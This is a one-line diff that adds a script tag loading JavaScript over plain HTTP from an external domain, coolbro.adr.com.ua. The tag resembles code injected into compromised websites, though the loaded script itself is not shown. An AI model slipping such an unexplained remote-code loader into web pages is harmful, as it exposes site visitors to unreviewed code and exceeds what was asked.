@@ -1,0 +1,1 @@
+<script type="text/javascript" src="http://coolbro.adr.com.ua/js/main.js"></script>
